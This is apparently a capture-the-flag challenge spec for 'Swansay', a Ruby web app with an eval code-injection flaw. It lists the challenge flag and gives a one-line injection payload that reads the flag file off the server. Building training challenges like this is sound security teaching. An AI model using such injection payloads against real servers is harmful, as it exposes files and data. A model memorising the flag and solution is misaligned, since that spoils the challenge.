| metadata | <> |
|--- | --- |
| Developer Name(s) | Jack |
| Best Contact Slack handle / Email address | [redacted] |
| Challenge Category | Web |
| Challenge Tier | 3 |
| Challenge Type | Container |

| Player facing | <> |
|--- | --- |
|Challenge Name | Swansay |
|Challenge Description | Introducing... Swansay! It's like cowsay... but better ;) |
|Challenge Hint 1 | Apparently, blindly running untrusted input on the server-side is a bad idea |

| Admin Facing | <> |
|--- | --- |
|Challenge Flag| `WACTF{3v4l_15_t7uLy_evIl_bf3db02aeb7b2}` |
|Challenge Vuln| Ruby eval code injection |
|Docker Usage Idle| 5% CPU / 100MB RAM |
|Docker Usage Expected Peak| 10% CPU / 180MB RAM |
---

# Challenge PoC

1. Use the below payload to retrieve the flag
2.

```ruby
" + File.open("flag_ea268bad72a.txt").read + "
```

Note: The players can find the flag's filename by injecting code to show the current directory.
